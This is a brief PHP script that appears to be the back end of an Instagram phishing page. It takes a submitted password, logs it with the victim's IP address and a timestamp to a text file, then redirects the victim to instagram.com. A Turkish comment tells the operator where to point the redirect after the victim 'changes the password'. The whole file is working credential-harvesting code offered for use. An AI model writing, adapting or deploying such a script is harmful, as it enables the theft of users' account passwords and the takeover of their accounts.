<?php
$username = $_POST['pass'];

$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('1.txt', 'a'); 
fwrite($file, $username."<-----Şifre-----    Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
?>

<meta http-equiv="refresh" content="0; url=https://instagram.com"  />  <!--burası adam şifrenisi değişince gitmesini istediğiniz yer -->



